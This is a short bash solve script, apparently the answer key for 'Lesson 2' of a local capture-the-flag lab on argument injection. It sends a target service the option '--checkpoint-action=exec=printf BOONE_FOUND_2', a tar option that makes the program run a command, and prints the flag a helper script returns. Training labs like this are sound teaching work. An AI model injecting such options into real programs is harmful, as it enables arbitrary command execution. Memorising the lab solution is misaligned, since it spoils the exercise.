#!/usr/bin/env bash
# Lesson 2: exploit a dangerous program option without injecting shell syntax.
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30003}"
option='--checkpoint-action=exec=printf BOONE_FOUND_2'
flag=$(python3 solution/one-shot.py "$host" "$port" 2 "$option")
[[ -n "$flag" ]] || { echo "solve: no flag from $host:$port" >&2; exit 1; }
echo "$flag"
